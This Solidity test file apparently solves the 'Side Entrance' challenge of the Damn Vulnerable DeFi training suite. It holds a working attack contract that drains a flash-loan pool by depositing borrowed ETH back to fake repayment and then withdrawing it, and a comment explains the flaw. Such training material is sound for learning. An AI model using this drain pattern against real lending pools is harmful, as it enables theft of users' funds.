// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";



contract Attack  {
    SideEntranceLenderPool public pool;
    address payable public receiver;

    constructor(SideEntranceLenderPool _pool, address payable _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    // Attack function
    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    // Callback function
    function execute() public payable  {
        pool.deposit{value: msg.value}();
    }
    // Fallback to receive ETH and forward it to recovery address
    receive() external payable {
        receiver.transfer(address(this).balance); 
    }
}



contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /*
        The exploit takes advantage of the fact that the SideEntranceLenderPool allows deposits during the flash loan callback.
        By taking out a flash loan and then depositing the borrowed amount back into the pool during the callback, the attacker
        can satisfy the loan requirement without actually repaying any ETH from their own balance. After the flash loan is
        considered repaid, the attacker can then withdraw their deposited amount, effectively draining all ETH from the pool.
        Finally, the attacker forwards all withdrawn ETH to the recovery address to meet the success conditions.
    */
    function test_sideEntrance() public checkSolvedByPlayer {
        
        //Deploy the attack contract
        Attack attacker = new Attack(pool, payable(recovery));
        attacker.attack(ETHER_IN_POOL);

    }

    

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
